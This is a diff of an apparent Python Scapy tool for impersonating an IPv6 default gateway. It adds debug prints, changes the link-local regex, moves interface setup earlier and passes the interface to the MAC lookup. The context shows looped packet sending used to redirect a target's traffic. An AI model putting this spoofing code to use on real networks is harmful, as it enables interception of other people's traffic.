@@ -46,6 +46,7 @@ def Redirect(target,gw,interface):
     send(p,iface=interface, loop=1, inter=0.1,verbose=0)
 
 def get_target_mac(target,interface):
+    print(myDevice.linklocal)
     r = srp1(Ether()/IPv6(src=myDevice.linklocal,dst=target)/ICMPv6ND_NS(tgt=target),iface=interface,verbose=0)
     return r.getlayer(Ether).src
 
@@ -84,13 +85,14 @@ def matchIPv6(addr):
 def get_linklocal(interface):
     r = read_routes6()
     for line in r:
-        if line[3] == interface and regex.match("^fe80::.+",line[0]) and matchIPv6(line[0]):
+        print(line)
+        if line[3] == interface and regex.match("^fe80:.+",line[0]) and matchIPv6(line[0]):
             return(str(line[4][0]))          
 
 def get_global(interface):
     r = read_routes6()
     for line in r:
-        if line[3] == interface and not regex.match("^fe80::.+",line[0]) and matchIPv6(line[0]):
+        if line[3] == interface and not regex.match("^fe80:.+",line[0]) and matchIPv6(line[0]):
             return(str(line[4][0]))        
 
 def source_in_targets(targets, source):
@@ -171,13 +173,18 @@ def mode_commands():
 @click.option("-gw", "--gateway", prompt="Enter the default gateway", help="The default gateway to impersonate")
 def gateway(target,targetsfile,gateway,interface):
 
+    conf.iface = interface
+    myDevice.linklocal = get_linklocal(interface=conf.iface)
+    myDevice.globalip = get_global(interface)
+    myDevice.macaddr = get_if_hwaddr(iff=interface)
+
     if targetsfile == None and target == None:
         raise SyntaxError("No valid target found, please use the -t or -T options")
     elif target == None:
         processTargetsFile(targetsfile,interface)
     else:
         #TODO: Get global ip
-        d = Device(macaddr = get_target_mac(target), linklocal = target,globalip="")
+        d = Device(macaddr = get_target_mac(target,interface), linklocal = target,globalip="")
         targets.append(d)
     
     if not matchIPv6(target):
@@ -189,13 +196,9 @@ def gateway(target,targetsfile,gateway,interface):
         return
     
     global gatewayDev
-    gatewayDev.macaddr = get_target_mac(gateway)
+    gatewayDev.macaddr = get_target_mac(gateway,interface)
     gatewayDev.linklocal = gateway
 
-    conf.iface = interface
-    myDevice.linklocal = get_linklocal(interface=conf.iface)
-    myDevice.globalip = get_global(interface)
-    myDevice.macaddr = get_if_hwaddr(iff=interface)
     if not matchIPv6(myDevice.linklocal):
         print(f"\"{myDevice.linklocal}\" is not a valid IPv6 address")
         return
